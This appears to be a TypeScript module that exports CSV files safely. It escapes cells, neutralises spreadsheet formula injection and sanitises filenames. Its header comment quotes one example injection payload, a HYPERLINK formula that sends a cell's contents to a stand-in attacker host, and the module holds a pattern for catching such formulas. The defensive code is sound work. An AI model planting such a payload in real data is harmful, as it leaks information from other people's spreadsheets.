/**
 * CSV, written for the spreadsheet it will actually be opened in.
 *
 * Two things matter here and neither is obvious.
 *
 * ESCAPING. A value containing a comma, a quote or a newline must be quoted,
 * and a quote inside it doubled. An employee whose location is "Apapa, Lagos"
 * silently becomes two columns otherwise, and every row after it in that file
 * is wrong in a way nobody notices until payroll disagrees with a spreadsheet.
 *
 * FORMULA INJECTION. Excel, LibreOffice and Google Sheets all execute a cell
 * beginning `=`, `+`, `-`, `@`, tab or carriage return. An applicant can type
 * their own name into the public careers form, so a name like
 * `=HYPERLINK("http://evil.example?d="&A1,"click")` becomes a live formula in
 * the HR manager's spreadsheet the moment they export. The cell is prefixed
 * with a single quote, which every one of those programs reads as "this is
 * text" and does not display. This is the whole reason exporting user-supplied
 * data is not just string concatenation.
 */

const NEEDS_QUOTING = /[",\r\n]/;
const FORMULA_START = /^[=+\-@\t\r]/;

/** One cell, escaped and made inert. */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  let text =
    value instanceof Date ? value.toISOString() : String(value);

  // Neutralise before quoting: a formula that is also quoted is still a
  // formula once the spreadsheet has parsed the quotes away.
  if (FORMULA_START.test(text)) text = `'${text}`;

  if (NEEDS_QUOTING.test(text)) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

export function csvRow(values: unknown[]): string {
  return values.map(csvCell).join(",");
}

/**
 * A complete file.
 *
 * CRLF because RFC 4180 says so and because Excel on Windows is the most
 * likely destination. The UTF-8 byte-order mark is added by the caller that
 * builds the response, not here — it belongs to the file, not to the text.
 */
export function toCsv<T>(
  rows: T[],
  columns: { header: string; value: (row: T) => unknown }[],
): string {
  const lines = [csvRow(columns.map((c) => c.header))];
  for (const row of rows) {
    lines.push(csvRow(columns.map((c) => c.value(row))));
  }
  return lines.join("\r\n");
}

/** Excel reads a file as the system codepage unless a BOM says otherwise. */
export const UTF8_BOM = "﻿";

/**
 * A filename that survives a Content-Disposition header.
 *
 * Anything outside a conservative set is dropped rather than encoded: the
 * organisation name reaches this, and a quote or a newline in a header is a
 * response-splitting problem, not a cosmetic one.
 */
export function safeFilename(parts: string[], extension = "csv"): string {
  const stem = parts
    .map((part) =>
      part
        .normalize("NFKD")
        .replace(/[^\w\s-]/g, "")
        .trim()
        .replace(/\s+/g, "-")
        .toLowerCase(),
    )
    .filter(Boolean)
    .join("-");

  return `${stem || "export"}.${extension}`;
}
